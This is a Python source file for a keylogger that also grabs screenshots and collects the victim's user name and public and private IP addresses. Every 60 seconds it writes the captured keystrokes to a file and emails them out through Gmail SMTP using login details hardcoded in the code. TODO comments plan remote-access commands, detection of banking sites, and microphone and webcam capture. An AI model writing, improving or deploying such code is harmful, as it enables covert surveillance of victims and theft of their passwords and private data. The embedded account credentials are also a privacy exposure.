# Third Party Modules
import base64

from pynput.keyboard import Listener as k_Listener
from pynput.mouse import Listener as m_Listener
import mss.tools

# TODO Replace this with a cross platform lib
try:
    import win32gui  # To get active window name
except:
    pass

# Standard Modules
import os
import time
import requests
import socket
import random
import threading
import smtplib  # To send an email

# User Defined Modules
import LogModel
from UserModel import UserModel


# TODO RAT - Give commands based on keyword
# TODO RAT - Request Log On Demand
# TODO RAT - Request ScreenShot On Demand

# TODO If User on apps such as, chrome take a screenshot
# TODO Detect if user visited a banking site

# TODO Improve key logging logic
# TODO Encrypt txt file

# TODO Improve screenshot logic
# TODO compress screenshots then upload them

# TODO Improve email logic
# TODO Send txt file as an email, then delete it

# TODO Microphone Access
# TODO Webcam Access

class Logger:

    def __init__(self):

        # Get time
        self.datetime = time.ctime(time.time())

        # To store previously active application
        self.old_app = ''
        self.old_file = ''

        # Create instance of the UserModel class
        self.User = UserModel(public_IP=requests.get('https://api.ipify.org/').text,
                              private_IP=socket.gethostbyname(socket.gethostname()),
                              # TODO this didn't work on kali. Array index was 2 for windows !
                              user=os.path.expanduser('~').split('\\')[0],
                              )

        # Define document info schema
        msg_Schema = f'[START OF LOGS]\n   Date/Time: {self.datetime}\n   User-Profile: {self.User.user}\n   ' \
                     f'Public-IP: {self.User.public_IP}\n    Private-IP: {self.User.private_IP}\n\n '

        # Create instance of the LogModel class
        self.Log = LogModel.LogModel(logOwner=msg_Schema, logText=[], logHeader=[])

    def log_data(self, key):

        # TODO win32gui is not cross platform

        # new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())  # Get name of active window
        #
        # # If user switch app, add to log
        # if new_app != self.old_app and new_app != '':
        #     self.Log.logHeader.append(f'\n[{self.datetime}] ~ {new_app}\n')
        #     self.Log.logText.append('\u26E7')
        #     self.old_app = new_app
        # else:
        #     pass

        # Change default key names to more readable one
        substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                        '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                        '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

        key = str(key).strip('\'')
        if key in substitution:
            self.Log.logText.append(substitution[substitution.index(key) + 1])
        else:
            self.Log.logText.append(key)

    def __write_file(self):

        filepath = os.path.expanduser('~') + '/Downloads/'
        filename = self.User.user + str(random.randint(11111, 99999)) + '.txt'
        file = filepath + filename

        if os.path.exists(self.old_file):
            os.remove(self.old_file)
        else:
            print("The file does not exist")

        self.old_file = file

        with open(file, 'w') as fp:
            fp.write(self.Log.toString())
            self.__send_email()
        print('written all good')

    # def save_screenshot(self, x, y, button, pressed):
    #
    #     if pressed:
    #         im = grab()
    #         im.save(os.path.expanduser('~') + '/Downloads/' + str(random.randint(11111, 99999)) + '.jpeg')

    def get_screenshot(self):

        with mss.mss() as screen:
            # Select all monitors
            monitor = screen.monitors[0]
            # Grab the picture
            im = screen.grab(monitor)
            # Get the entire PNG raw bytes
            raw_bytes = mss.tools.to_png(im.rgb, im.size)

        return base64.b64encode(raw_bytes).decode()

    def __send_email(self):
        sender_email = "firstdjin@gmail.com"
        receiver_email = "firstdjin@gmail.com"
        password = "djin1234"
        message = self.Log.toString().encode()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    def send_logs(self):
        previous_log_text = ''
        previous_log_header = ''

        while True:

            time.sleep(60)

            if len(self.Log.logText) > 1 and \
                    (''.join(self.Log.logText) != previous_log_text or ''.join(
                        self.Log.logHeader) != previous_log_header):
                previous_log_text = ''.join(self.Log.logText)
                previous_log_header = ''.join(self.Log.logHeader)
                self.__write_file()

    def key_logger(self):
        with k_Listener(on_press=self.log_data) as k_listen:
            try:
                k_listen.join()
            except:
                pass

    # def screen_logger(self):
    #     with m_Listener(on_click=self.save_screenshot) as m_listen:
    #         try:
    #             m_listen.join()
    #         except:
    #             pass
